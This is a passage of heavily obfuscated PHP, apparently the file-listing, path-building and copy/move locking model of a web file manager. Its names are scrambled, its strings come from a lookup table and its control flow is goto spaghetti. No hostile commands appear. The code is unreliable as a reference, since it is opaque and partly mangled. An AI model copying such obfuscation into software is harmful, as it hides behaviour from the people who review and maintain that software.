(!$E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]] && $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[368]] == self::TYPE_GROUP) { $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]] = Action($FÜĞì¾•™[451])->pathGroupAuthMake($E§¼Å÷ÁƒŠ[$FÜĞì¾•™[452]]); if (!$E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]] && !$GLOBALS[$FÜĞì¾•™[453]]) { $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[186]] = !1; $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[185]] = !1; } } if ($E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]]) { $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[186]] = AuthModel::authCheckEdit($E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]][$FÜĞì¾•™[374]]); $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[185]] = AuthModel::authCheckView($E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]][$FÜĞì¾•™[374]]); } $this->groupPathDisplay($E§¼Å÷ÁƒŠ); } goto bŒ¬ÍæÃ‡; d•†Äù‚‡Š: $FÜĞì¾•™ =& $_SERVER[÷ÖêïÔÔÓ]; if (!defined($FÜĞì¾•™[423])) { return; } $c¬Öæè÷ŠÖ = array(); goto C’§•Ø«¤»; bŒ¬ÍæÃ‡: } public function groupPathDisplay(&$A“É—Ôã„Ö) { goto dĞòÂà¶˜š; dĞòÂà¶˜š: $DßŸ ÷¹Ğï =& $_SERVER[÷ÖêïÔÔÓ]; if ($A“É—Ôã„Ö[$DßŸ ÷¹Ğï[368]] != self::TYPE_GROUP) { return; } $D—æÄŒŠë¤ = Model($DßŸ ÷¹Ğï[454])->getInfo($A“É—Ôã„Ö[$DßŸ ÷¹Ğï[452]]); goto FÆ»íâ¢; FÆ»íâ¢: $E¹‘ÕÇß— = $this->parentLevelArray($D—æÄŒŠë¤[$DßŸ ÷¹Ğï[455]]); $b˜ÙÒä¯í‹ = $DßŸ ÷¹Ğï[33]; foreach ($E¹‘ÕÇß— as $b½¡êÕ‘ò) { $fËã‚ÊÓå = Model($DßŸ ÷¹Ğï[454])->getInfo($b½¡êÕ‘ò); $b˜ÙÒä¯í‹ .= $fËã‚ÊÓå[$DßŸ ÷¹Ğï[388]][$DßŸ ÷¹Ğï[366]] . $DßŸ ÷¹Ğï[47]; } goto d§ËÖê­à ; bíßËÆÙæÄ: $A“É—Ôã„Ö[$DßŸ ÷¹Ğï[460]] = $b˜ÙÒä¯í‹ . $D—æÄŒŠë¤[$DßŸ ÷¹Ğï[388]][$DßŸ ÷¹Ğï[366]]; goto DãÉ­†´„Ú; d§ËÖê­à : $A“É—Ôã„Ö[$DßŸ ÷¹Ğï[456]] = $D—æÄŒŠë¤[$DßŸ ÷¹Ğï[457]]; $A“É—Ôã„Ö[$DßŸ ÷¹Ğï[377]] = $D—æÄŒŠë¤[$DßŸ ÷¹Ğï[455]]; $A“É—Ôã„Ö[$DßŸ ÷¹Ğï[458]] = $D—æÄŒŠë¤[$DßŸ ÷¹Ğï[459]]; goto bíßËÆÙæÄ; DãÉ­†´„Ú: } protected function _listAppendPath(&$eß—™™ìÕ³) { goto C´âÂÊŒÊ; A°‚ßÄèé‰: $C­·¸í®õ¨ = array(); foreach ($Dæ‡¬Ô‹µŞ as $aØİğô«å¬ => $d‘íó„Á„©) { if (!$d‘íó„Á„©) { $C­·¸í®õ¨[] = $aØİğô«å¬; } } if ($C­·¸í®õ¨) { $bµÊ÷ë·•° = array($C§ó¶ƒ‰[380] => array($C§ó¶ƒ‰[381], $C­·¸í®õ¨)); if (count($C­·¸í®õ¨) == 1) { $aæ§İˆ‚Ê = $this->sourceInfo($C­·¸í®õ¨[0]); $aæ§İˆ‚Ê = is_array($aæ§İˆ‚Ê) ? array($aæ§İˆ‚Ê) : !1; } else { $aæ§İˆ‚Ê = $this->field($C§ó¶ƒ‰[461])->where($bµÊ÷ë·•°)->select(); } $CØÄ©»©È¾ = array_to_keyvalue($aæ§İˆ‚Ê, $C§ó¶ƒ‰[366], $C§ó¶ƒ‰[28]); $Dæ‡¬Ô‹µŞ = array_merge_index($Dæ‡¬Ô‹µŞ, $CØÄ©»©È¾); } goto d»ƒ¡éô°Ÿ; C´âÂÊŒÊ: $C§ó¶ƒ‰ =& $_SERVER[÷ÖêïÔÔÓ]; $Dæ‡¬Ô‹µŞ = array(); foreach ($eß—™™ìÕ³ as &$CÕÉ”º•) { $Dæ‡¬Ô‹µŞ[$CÕÉ”º•[$C§ó¶ƒ‰[366]]] = $CÕÉ”º•[$C§ó¶ƒ‰[28]]; $BÙĞ„‚Õ÷Ò = $this->parentLevelArray($CÕÉ”º•[$C§ó¶ƒ‰[455]]); array_shift($BÙĞ„‚Õ÷Ò); foreach ($BÙĞ„‚Õ÷Ò as $DøÌš»—¼æ) { if (!isset($Dæ‡¬Ô‹µŞ[$DøÌš»—¼æ])) { $Dæ‡¬Ô‹µŞ[$DøÌš»—¼æ] = 0; } } } goto A°‚ßÄèé‰; d»ƒ¡éô°Ÿ: foreach ($eß—™™ìÕ³ as &$CÕÉ”º•) { goto EÊ…ğãÅŸğ; CìŒàÔ‘ÃŒ: $bœ ¸Ÿ‡×… = trim($CÕÉ”º•[$C§ó¶ƒ‰[462]], $C§ó¶ƒ‰[8]); if ($CÕÉ”º•[$C§ó¶ƒ‰[457]] == $C§ó¶ƒ‰[464] && $bœ ¸Ÿ‡×…) { $CÕÉ”º•[$C§ó¶ƒ‰[28]] = $bœ ¸Ÿ‡×…; } goto fÖÄïø…³ö; EÊ…ğãÅŸğ: $BÙĞ„‚Õ÷Ò = $this->parentLevelArray($CÕÉ”º•[$C§ó¶ƒ‰[455]]); $fñ‡É«óŸÓ = $this->_listAppendPathRoot($CÕÉ”º•, $BÙĞ„‚Õ÷Ò); foreach ($BÙĞ„‚Õ÷Ò as $DøÌš»—¼æ) { if (isset($Dæ‡¬Ô‹µŞ[$DøÌš»—¼æ])) { $fñ‡É«óŸÓ .= $Dæ‡¬Ô‹µŞ[$DøÌš»—¼æ] . $C§ó¶ƒ‰[8]; } } goto dº­‹‹²; dº­‹‹²: if ($BÙĞ„‚Õ÷Ò) { $fñ‡É«óŸÓ .= $CÕÉ”º•[$C§ó¶ƒ‰[28]]; } if ($CÕÉ”º•[$C§ó¶ƒ‰[367]]) { $fñ‡É«óŸÓ .= $C§ó¶ƒ‰[8]; } $CÕÉ”º•[$C§ó¶ƒ‰[462]] = str_replace($C§ó¶ƒ‰[463], $C§ó¶ƒ‰[8], $fñ‡É«óŸÓ); goto CìŒàÔ‘ÃŒ; fÖÄïø…³ö: } goto fï°ù£Áñ«; fï°ù£Áñ«: } protected function _listAppendPathRoot(&$EÙĞÉä£œ£, $C®÷‚ö“‘›) { $F‡¬Ê÷Ï =& $_SERVER[÷ÖêïÔÔÓ]; $BØ…Ë”‘±† = $F‡¬Ê÷Ï[33]; if ($EÙĞÉä£œ£[$F‡¬Ê÷Ï[368]] == self::TYPE_USER) { if ($EÙĞÉä£œ£[$F‡¬Ê÷Ï[452]] == USER_ID) { $BØ…Ë”‘±† = LNG($F‡¬Ê÷Ï[465]); if (!$C®÷‚ö“‘›) { $EÙĞÉä£œ£[$F‡¬Ê÷Ï[28]] = $BØ…Ë”‘±†; } } else { $BÉ§ó½øŒÖ = Model($F‡¬Ê÷Ï[466])->getInfoSimple($EÙĞÉä£œ£[$F‡¬Ê÷Ï[452]]); $BØ…Ë”‘±† = LNG($F‡¬Ê÷Ï[467]) . $F‡¬Ê÷Ï[154] . $BÉ§ó½øŒÖ[$F‡¬Ê÷Ï[28]] . $F‡¬Ê÷Ï[468]; } } else { if ($EÙĞÉä£œ£[$F‡¬Ê÷Ï[368]] == self::TYPE_GROUP) { $BÉ§ó½øŒÖ = Model($F‡¬Ê÷Ï[454])->getInfoSimple($EÙĞÉä£œ£[$F‡¬Ê÷Ï[452]]); $BØ…Ë”‘±† = $BÉ§ó½øŒÖ[$F‡¬Ê÷Ï[28]]; } else { if ($EÙĞÉä£œ£[$F‡¬Ê÷Ï[368]] == self::TYPE_SYSTEM) { $BÉ§ó½øŒÖ = $this->sourceInfo($C®÷‚ö“‘›[0], !0); $BØ…Ë”‘±† = $BÉ§ó½øŒÖ[$F‡¬Ê÷Ï[28]]; } } } $BØ…Ë”‘±† = $BØ…Ë”‘±† ? $F‡¬Ê÷Ï[8] . $BØ…Ë”‘±† . $F‡¬Ê÷Ï[8] : $F‡¬Ê÷Ï[8]; return $BØ…Ë”‘±†; } protected function _listAppendUser(&$C¿Û¨Ë±ß) { $fšŒ’®‹¦ =& $_SERVER[÷ÖêïÔÔÓ]; $EƒØ±¹›¡ã = array_to_keyvalue($C¿Û¨Ë±ß, $fšŒ’®‹¦[33], $fšŒ’®‹¦[375]); $dóÒ÷¤©‹Î = array_to_keyvalue($C¿Û¨Ë±ß, $fšŒ’®‹¦[33], $fšŒ’®‹¦[376]); $d’‡˜ñ‰Ç¥ = array_merge($EƒØ±¹›¡ã, $dóÒ÷¤©‹Î); $aâ„ìÃÜğï = Model($fšŒ’®‹¦[469])->userListInfo($d’‡˜ñ‰Ç¥); foreach ($C¿Û¨Ë±ß as &$eœƒÃ•‚Õ) { $D´ğÒùæ… = $eœƒÃ•‚Õ[$fšŒ’®‹¦[375]]; $eœƒÃ•‚Õ[$fšŒ’®‹¦[375]] = $aâ„ìÃÜğï[$D´ğÒùæ…] ? $aâ„ìÃÜğï[$D´ğÒùæ…] : !1; $D´ğÒùæ… = $eœƒÃ•‚Õ[$fšŒ’®‹¦[376]]; $eœƒÃ•‚Õ[$fšŒ’®‹¦[376]] = $aâ„ìÃÜğï[$D´ğÒùæ…] ? $aâ„ìÃÜğï[$D´ğÒùæ…] : !1; if (isset($eœƒÃ•‚Õ[$fšŒ’®‹¦[413]]) && $eœƒÃ•‚Õ[$fšŒ’®‹¦[413]][$fšŒ’®‹¦[470]]) { $B¡¨óŠí¦Ø = $GLOBALS[$fšŒ’®‹¦[6]][$fšŒ’®‹¦[84]][$fšŒ’®‹¦[471]]; if ($eœƒÃ•‚Õ[$fšŒ’®‹¦[413]][$fšŒ’®‹¦[472]] <= time() - $B¡¨óŠí¦Ø) { $this->metaSet($eœƒÃ•‚Õ[$fšŒ’®‹¦[366]], $fšŒ’®‹¦[470], null); $this->metaSet($eœƒÃ•‚Õ[$fšŒ’®‹¦[366]], $fšŒ’®‹¦[472], null); unset($eœƒÃ•‚Õ[$fšŒ’®‹¦[413]][$fšŒ’®‹¦[470]]); continue; } $A™’‚Ğ„¸ = $eœƒÃ•‚Õ[$fšŒ’®‹¦[413]][$fšŒ’®‹¦[470]]; $eœƒÃ•‚Õ[$fšŒ’®‹¦[413]][$fšŒ’®‹¦[473]] = Model($fšŒ’®‹¦[469])->getInfoSimpleOuter($A™’‚Ğ„¸); } } } public function parentLevelArray($E¬ÏÙÇ‹»í) { $A¢‡§ïÎŸ’ =& $_SERVER[÷ÖêïÔÔÓ]; $E¬ÏÙÇ‹»í = explode($A¢‡§ïÎŸ’[47], trim($E¬ÏÙÇ‹»í, $A¢‡§ïÎŸ’[47])); return array_remove_value($E¬ÏÙÇ‹»í, $A¢‡§ïÎŸ’[464]); } public function listAll($bŠ‰ô«å÷) { goto DÀíæœŒÂ¬; C°»¬êòÀÆ: $Fç´›ñ¬â° = array(); foreach ($C­¬Ëâ¿ó as $e„ã©´—ƒ => $e¸Ü™½àÛ) { goto AÈÒâŸ¯›ò; Cí¢™Ş¶À¡: $Cùè—¼î™‹ = str_replace($B÷ÑáÒ“»[463], $B÷ÑáÒ“»[8], $Cùè—¼î™‹); $Cùè—¼î™‹ = str_replace($B÷ÑáÒ“»[463], $B÷ÑáÒ“»[8], $Cùè—¼î™‹); $dí®Ê´±› = array($B÷ÑáÒ“»[384] => str_replace($B÷ÑáÒ“»[463], $B÷ÑáÒ“»[8], $Cùè—¼î™‹), $B÷ÑáÒ“»[480] => intval($e¸Ü™½àÛ[$B÷ÑáÒ“»[367]]), $B÷ÑáÒ“»[388] => $this->pathInfoFilter($e¸Ü™½àÛ, !0)); goto AÈœÄĞÍĞ; c®‚¶›±ó: for ($eÏäÆ‡ïßŠ = 0; $eÏäÆ‡ïßŠ < count($c’íñãØ¾è); $eÏäÆ‡ïßŠ++) { $Cùè—¼î™‹ .= $C­¬Ëâ¿ó[$c’íñãØ¾è[$eÏäÆ‡ïßŠ]][$B÷ÑáÒ“»[28]] . $B÷ÑáÒ“»[8]; } $Cùè—¼î™‹ .= $e¸Ü™½àÛ[$B÷ÑáÒ“»[28]]; if ($e¸Ü™½àÛ[$B÷ÑáÒ“»[367]]) { $Cùè—¼î™‹ .= $B÷ÑáÒ“»[8]; } goto Cí¢™Ş¶À¡; AÈœÄĞÍĞ: if (!$e¸Ü™½àÛ[$B÷ÑáÒ“»[367]]) { $dí®Ê´±›[$B÷ÑáÒ“»[415]] = $e¸Ü™½àÛ[$B÷ÑáÒ“»[415]]; $dí®Ê´±›[$B÷ÑáÒ“»[481]] = $e¸Ü™½àÛ[$B÷ÑáÒ“»[76]]; } $Fç´›ñ¬â°[] = $dí®Ê´±›; goto cÈ¦Æ¥ç¾; AÈÒâŸ¯›ò: $c’íñãØ¾è = $this->parentLevelArray($e¸Ü™½àÛ[$B÷ÑáÒ“»[455]]); array_shift($c’íñãØ¾è); $Cùè—¼î™‹ = $BİÅ½«¡Ç¨; goto c®‚¶›±ó; cÈ¦Æ¥ç¾: } return $Fç´›ñ¬â°; goto aÊ¸ˆ•›‡¢; F—Õ¼·¯ª”: $this->_listAppendAuth($C­¬Ëâ¿ó); $this->_listAppendUser($C­¬Ëâ¿ó); $this->_listAppendPath($C­¬Ëâ¿ó); goto Aôî‡êÏöÙ; Aôî‡êÏöÙ: $C­¬Ëâ¿ó = array_to_keyvalue($C­¬Ëâ¿ó, $B÷ÑáÒ“»[366]); $BİÅ½«¡Ç¨ = "\x2f{$b‹¦ôšÈ×[$B÷ÑáÒ“»[28]]}\x2f"; $BİÅ½«¡Ç¨ = $BİÅ½«¡Ç¨ == $B÷ÑáÒ“»[463] ? $B÷ÑáÒ“»[8] : $BİÅ½«¡Ç¨; goto C°»¬êòÀÆ; b§ İ¢°ê†: $f…‘ÅŸì“Œ = $B÷ÑáÒ“»[478]; $aç—ëéƒ¡ = "\114\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\137\x66\151\x6c\145\x20\146\x69\154\x65\x20\x6f\156\40\163\157\x75\162\x63\145\x2e\146\x69\x6c\145\111\104\x20\75\x20\x66\151\154\145\56\146\x69\x6c\x65\111\104"; $C­¬Ëâ¿ó = $this->alias($B÷ÑáÒ“»[479])->field($f…‘ÅŸì“Œ)->where($Bê åöÛà)->join($aç—ëéƒ¡)->select(); goto F—Õ¼·¯ª”; DÀíæœŒÂ¬: $B÷ÑáÒ“» =& $_SERVER[÷ÖêïÔÔÓ]; $b‹¦ôšÈ× = $this->sourceInfo($bŠ‰ô«å÷); $Bê åöÛà = array($B÷ÑáÒ“»[474] => array($B÷ÑáÒ“»[475], $b‹¦ôšÈ×[$B÷ÑáÒ“»[455]] . $bŠ‰ô«å÷ . $B÷ÑáÒ“»[476]), $B÷ÑáÒ“»[477] => 0); goto b§ İ¢°ê†; aÊ¸ˆ•›‡¢: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($EÅ«¼ˆá°â) { goto b…«å­âÃ; b…«å­âÃ: $Däø÷Œ¸Š =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Däø÷Œ¸Š[482], $EÅ«¼ˆá°â); goto D±„¬Ò§ö·; D±„¬Ò§ö·: $FÈ×ßŠÑ = 1; $this->_lockEvent($EÅ«¼ˆá°â, array($Däø÷Œ¸Š[483], $Däø÷Œ¸Š[484]), $FÈ×ßŠÑ); $this->_lockParent($EÅ«¼ˆá°â, array($Däø÷Œ¸Š[484]), $FÈ×ßŠÑ); goto F‰òïğÄ°É; F‰òïğÄ°É: $this->_lockEvent($EÅ«¼ˆá°â, array($Däø÷Œ¸Š[485], $Däø÷Œ¸Š[486]), $FÈ×ßŠÑ); $this->_lockCheckEnd($Däø÷Œ¸Š[482], $EÅ«¼ˆá°â); goto CØèÉç‡¨é; CØèÉç‡¨é: } public function lockCopyEnd($cÅİîÓÆÛˆ) { $DˆÂë£×ğ† =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $d™‘ĞÉÃ™İ = 0; $this->_lockEvent($cÅİîÓÆÛˆ, array($DˆÂë£×ğ†[483], $DˆÂë£×ğ†[484]), $d™‘ĞÉÃ™İ); $this->_lockParent($cÅİîÓÆÛˆ, array($DˆÂë£×ğ†[484]), $d™‘ĞÉÃ™İ); $this->_lockEvent($cÅİîÓÆÛˆ, array($DˆÂë£×ğ†[485], $DˆÂë£×ğ†[486]), $d™‘ĞÉÃ™İ); } public function lockWriteStart($dï‰òŸÍÕ¨, $bùÉçÖÈŞ§ = '') { goto B±¬ÛˆÁÉ; B±¬ÛˆÁÉ: $A’Ôä¿Ûœ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $this->_lockCheck($A’Ôä¿Ûœ[483], $dï‰òŸÍÕ¨); goto EÌï˜„„Ø ; Bêõœ‘‡Ë: $this->_lockParent($dï‰òŸÍÕ¨, array($A’Ôä¿Ûœ[482], $A’Ôä¿Ûœ[484]), $C›ñŞƒ¥Ú¯); $this->_lockCheckEnd($A’Ôä¿Ûœ[483], $dï‰òŸÍÕ¨); goto eŞÂ˜Ÿ¾º; EÌï˜„„Ø : $C›ñŞƒ¥Ú¯ = 1; $this->_lockKey($A’Ôä¿Ûœ[487] . $dï‰òŸÍÕ¨ . $A’Ôä¿Ûœ[92] . $bùÉçÖÈŞ§, $C›ñŞƒ¥Ú¯); $this->_lockEvent($dï‰òŸÍÕ¨, array($A’Ôä¿Ûœ[482], $A’Ôä¿Ûœ[484]), $C›ñŞƒ¥Ú¯); goto Bêõœ‘‡Ë; eŞÂ˜Ÿ¾º: } public function lockWriteEnd($Eé¿Ù‚»¹©, $eÊÓ´™‹‚º = '') { $e’¦Íô™‚´ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $AÖ‹¸Ä¬ë¤ = 0; $this->_lockKey($e’¦Íô™‚´[487] . $Eé¿Ù‚»¹© . $e’¦Íô™‚´[92] . $eÊÓ´™‹‚º, $AÖ‹¸Ä¬ë¤); $this->_lockEvent($Eé¿Ù‚»¹©, array($e’¦Íô™‚´[482], $e’¦Íô™‚´[484]), $AÖ‹¸Ä¬ë¤); $this->_lockParent($Eé¿Ù‚»¹©, array($e’¦Íô™‚´[482], $e’¦Íô™‚´[484]), $AÖ‹¸Ä¬ë¤); } public function lockMoveStart($dÌÌ†²ì†É) { goto aŒ§ ½îÓ; aò¹«è­: $this->_lockParent($dÌÌ†²ì†É, array($a­éŞ–‰±‰[482], $a­éŞ–‰±‰[484]), $EâŸÊ†»Ôƒ); $this->_lockEvent($dÌÌ†²ì†É, array($a­éŞ–‰±‰[489], $a­éŞ–‰±‰[485], $a­éŞ–‰±‰[486]), $EâŸÊ†»Ôƒ); $this->_lockCheckEnd($a­éŞ–‰±‰[484], $dÌÌ†²ì†É); goto e¼ï¢ˆ‹Š“; A©âöÑí†: $EâŸÊ†»Ôƒ = 1; $this->_lockKey($a­éŞ–‰±‰[488] . $dÌÌ†²ì†É, $EâŸÊ†»Ôƒ); $this->_lockEvent($dÌÌ†²ì†É, array($a­éŞ–‰±‰[482], $a­éŞ–‰±‰[483]), $EâŸÊ†»Ôƒ); goto aò¹«è­; aŒ§ ½îÓ: $a­éŞ–‰±‰ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $this->_lockCheck($a­éŞ–‰±‰[484], $dÌÌ†²ì†É); goto A©âöÑí†; e¼ï¢ˆ‹Š“: } public function lockMoveEnd($D»¥˜ÂàÈ©) { goto Cª›­ƒ·Å; Cª›­ƒ·Å: $CÇ¡Ü°ÍË  =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->allowLock()) { return; } $D«áÛÕğÕĞ = 0; goto Cê»‹Ì‰Úº; aŒã‡•‡Ë¢: $this->_lockEvent($D»¥˜ÂàÈ©, array($CÇ¡Ü°ÍË [489], $CÇ¡Ü°ÍË [485], $CÇ¡Ü°ÍË [486]), $D«áÛÕğÕĞ); goto Eá¢õâ; Cê»‹Ì‰Úº: $this->_lockKey($CÇ¡Ü°ÍË [488] . $D»¥˜ÂàÈ©, $D«áÛÕğÕĞ); $this->_lockEvent($D»¥˜ÂàÈ©, array($CÇ¡Ü°ÍË [482], $CÇ¡Ü°ÍË [483]), $D«áÛÕğÕĞ); $this->_lockParent($D»¥˜ÂàÈ©, array($CÇ¡Ü°ÍË [482], $CÇ¡Ü°ÍË [484]), $D«áÛÕğÕĞ); goto aŒã‡•‡Ë¢; Eá¢õâ: } private function _lockCheck($AŒÎÍÖíÂ¡, $fÁ¬ÊÅÖï) { goto EÓîñ‹»š’; cØµíá¢ğê: $this->_lockTimeStart[$f¶¬ğ‡•³ˆ] = timeFloat(); if (!is_array($d’™¿ÅŒ£•)) { return; } $b´Ë³¿İå® = LNG($aó£©…—à¿[490]); goto DĞ×’ßí; a½à¤ó÷Àˆ: $c¹‡¾×ÒØµ = array_reverse($this->parentLevelArray($d’™¿ÅŒ£•[$aó£©…—à¿[455]])); foreach ($c¹‡¾×ÒØµ as $FÜ‰Ö”‰ª’) { $f¶¬ğ‡•³ˆ = $AŒÎÍÖíÂ¡ . $aó£©…—à¿[491] . $FÜ‰Ö”‰ª’; if (CacheLock::lockGet($aó£©…—à¿[492] . $f¶¬ğ‡•³ˆ)) { $d’™¿ÅŒ£• = $this->sourceInfo($FÜ‰Ö”‰ª’); CacheLock::setErrorMsg($aó£©…—à¿[154] . htmlspecialchars($d’™¿ÅŒ£•[$aó£©…—à¿[28]]) . $aó£©…—à¿[468] . $b´Ë³¿İå®); $this->_lockKey($f¶¬ğ‡•³ˆ, 1); $this->_lockKey($f¶¬ğ‡•³ˆ, 0); } } goto D³Â™àÆÚ; DĞ×’ßí: CacheLock::setErrorMsg($aó£©…—à¿[154] . htmlspecialchars($d’™¿ÅŒ£•[$aó£©…—à¿[28]]) . $aó£©…—à¿[468] . $b´Ë³¿İå®); $this->_lockKey($f¶¬ğ‡•³ˆ, 1); $this->_lockKey($f¶¬ğ‡•³ˆ, 0); goto a½à¤ó÷Àˆ; EÓîñ‹»š’: $aó£©…—à¿ =& $_SERVER[÷ÖêïÔÔÓ]; $d’™¿ÅŒ£• = $this->sourceInfo($fÁ¬ÊÅÖï); $f¶¬ğ‡•³ˆ = $AŒÎÍÖíÂ¡ . $aó£©…—à¿[92] . $fÁ¬ÊÅÖï; goto cØµíá¢ğê; D³Â™àÆÚ: } private function _lockCheckEnd($eªºĞ»´†É, $FÎº¶Åà¯È) { goto f«Ö‘ØøÀÚ; Eì·™Ò§: if ($dŸ‚‡¤ùÌ > 0.5) { unset(self::$cacheSourceInfo[$bŒÁ¡Õç×“[406] . $FÎº¶Åà¯È]); } $e¨“ÖÅ³¤Õ = $this->sourceInfo($FÎº¶Åà¯È); if (!$e¨“ÖÅ³¤Õ) { show_json(LNG($bŒÁ¡Õç×“[101]), !1); } goto cÚÖ”œ‘­—; a±áÎî„: if (!isset($this->_lockTimeStart[$Eï«Œˆá®º])) { return; } $dŸ‚‡¤ùÌ = timeFloat() - $this->_lockTimeStart[$Eï«Œˆá®º]; unset($this->_lockTimeStart[$Eï«Œˆá®º]); goto Eì·™Ò§; f«Ö‘ØøÀÚ: $bŒÁ¡Õç×“ =& $_SERVER[÷ÖêïÔÔÓ]; $Eï«Œˆá®º = $eªºĞ»´†É . $bŒÁ¡Õç×“[92] . $FÎº¶Åà¯È; CacheLock::setErrorMsg($bŒÁ¡Õç×“[358]); goto a±áÎî„; cÚÖ”œ‘­—: } private function _lockParent($f­ÈéĞò›¢, $aÙîÈ±—Î¸, $dÔŠìéÖÀÖ) { if (!$this->autoLockSet) { return; } $E›È¡¾‰™¡ = $this->sourceInfo($f­ÈéĞò›¢); if (!is_array($E›È¡¾‰™¡)) { return; } $E„îâĞêĞŒ = array_reverse($this->parentLevelArray($E›È¡¾‰™¡[$_SERVER[÷ÖêïÔÔÓ][455]])); foreach ($E„îâĞêĞŒ as $fõíÁ¯š„Ø) { $this->_lockEvent($fõíÁ¯š„Ø, $aÙîÈ±—Î¸, $dÔŠìéÖÀÖ); } } private function _lockEvent($aæŠ¾“ ìè, $A¨Ê‰ÖÂÇõ, $e®è¶éğ®) { $E¿õ¶¥À¿ƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->autoLockSet) { return; } foreach ($A¨Ê‰ÖÂÇõ as $fÜÅ™¬¨©‹) { $cÕõìƒ÷®¼ = $fÜÅ™¬¨©‹ . $E¿õ¶¥À¿ƒ[92] . $aæŠ¾“ ìè; if ($e®è¶éğ® && CacheLock::lockGet($E¿õ¶¥À¿ƒ[492] . $cÕõìƒ÷®¼)) { continue; } $this->_lockKey($cÕõìƒ÷®¼, $e®è¶éğ®); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c¶…ÏÍö½, $fëè¨ëËœª = 1) { $dˆï‹ÆÁµâ = $_SERVER[÷ÖêïÔÔÓ][492] . $c¶…ÏÍö½; if ($fëè¨ëËœª) { if (isset(self::$_lockItemArr[$dˆï‹ÆÁµâ])) { return; } self::$_lockItemArr[$dˆï‹ÆÁµâ] = 1; CacheLock::lock($dˆï‹ÆÁµâ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$dˆï‹ÆÁµâ])) { return; } unset(self::$_lockItemArr[$dˆï‹ÆÁµâ]); CacheLock::unlock($dˆï‹ÆÁµâ); } } public function isParentOf($c§ó‰ìí«Ÿ, $AÄëÉ¾†Üë) { goto AŠ™ÍÕ¯—ø; cÕ‰‹Âª‚: $Dåõ «¿‡ò = $b±¸ò´ÅÃ[$eóø„®Ö³ö[455]] . $b±¸ò´ÅÃ[$eóø„®Ö³ö[366]] . $eóø„®Ö³ö[47]; $aõ»ïä¦Î• = $DÒ®ŒîØñ[$eóø„®Ö³ö[455]] . $DÒ®ŒîØñ[$eóø„®Ö³ö[366]] . $eóø„®Ö³ö[47]; $e¨ê¾Œó¸½ = strpos($aõ»ïä¦Î•, $Dåõ «¿‡ò) === 0; goto eĞéËã‰ìé; AŠ™ÍÕ¯—ø: $eóø„®Ö³ö =& $_SERVER[÷ÖêïÔÔÓ]; $b±¸ò´ÅÃ = $this->sourceInfo($c§ó‰ìí«Ÿ); $DÒ®ŒîØñ = $this->sourceInfo($AÄëÉ¾†Üë); goto cÕ‰‹Âª‚; eĞéËã‰ìé: return $e¨ê¾Œó¸½; goto a²ÓÔŞ§Š­; a²ÓÔŞ§Š­: } public function copy($fÆõ®óˆâö, $b¯ç„±¸Å±, $aË êóÔ´¸ = REPEAT_REPLACE, $EìÔ®ìº” = '') { goto A¢Ç¡„’—; F“ØÚº°¿Ú: $this->lockCopyStart($fÆõ®óˆâö); $this->lockWriteStart($b¯ç„±¸Å±, $B‹‹ˆÛÆ™ç); $cùòóçÊ‚ô = array($aÅ¦ŞŸ“Ó[494] => array(), $aÅ¦ŞŸ“Ó[495] => array(), $aÅ¦ŞŸ“Ó[496] => array()); goto a‹ùŠ¼ÅŠ‘; dôéçïªÚ : $this->lockCopyEnd($fÆõ®óˆâö); $this->lockWriteEnd($b¯ç„±¸Å±, $B‹‹ˆÛÆ™ç); if ($dÃ™ï©ï¹[$aÅ¦ŞŸ“Ó[367]] == $aÅ¦ŞŸ“Ó[493] && $Aßõ“©ß±Á == $D«¦ŠËíœ) { $this->folderSizeResetChildren($Aßõ“©ß±Á); } goto fò¦°” º ; fò¦°” º : Model($aÅ¦ŞŸ“Ó[497])->addAll($cùòóçÊ‚ô[$aÅ¦ŞŸ“Ó[495]], array(), !0); if ($Aßõ“©ß±Á != $D«¦ŠËíœ || $dÃ™ï©ï¹[$aÅ¦ŞŸ“Ó[367]] == $aÅ¦ŞŸ“Ó[493]) { Model($aÅ¦ŞŸ“Ó[498])->eventCopy($D«¦ŠËíœ); } $this->saveAll($cùòóçÊ‚ô[$aÅ¦ŞŸ“Ó[496]]); goto A½³¥Âã‰©; A¢Ç¡„’—: $aÅ¦ŞŸ“Ó =& $_SERVER[÷ÖêïÔÔÓ]; $dÃ™ï©ï¹ = $this->sourceInfo($fÆõ®óˆâö); $fÉ†ôìÇô¼ = $this->sourceInfo($b¯ç„±¸Å±); goto d·ˆÊ›ùÄ´; d·ˆÊ›ùÄ´: if (!$dÃ™ï©ï¹ || !$fÉ†ôìÇô¼ || $fÉ†ôìÇô¼[$aÅ¦ŞŸ“Ó[367]] != $aÅ¦ŞŸ“Ó[493]) { return !1; } if ($this->isParentOf($fÆõ®óˆâö, $b¯ç„±¸Å±)) { return !1; } $B‹‹ˆÛÆ™ç = $EìÔ®ìº” ? $EìÔ®ìº” : $dÃ™ï©ï¹[$aÅ¦ŞŸ“Ó[28]]; goto F“ØÚº°¿Ú; a‹ùŠ¼ÅŠ‘: $Aßõ“©ß±Á = $this->fileNameExistCache($b¯ç„±¸Å±, $dÃ™ï©ï¹[$aÅ¦ŞŸ“Ó[28]]); $D«¦ŠËíœ = $this->_copy($fÆõ®óˆâö, $b¯ç„±¸Å±, $aË êóÔ´¸, $cùòóçÊ‚ô, !0, $EìÔ®ìº”); 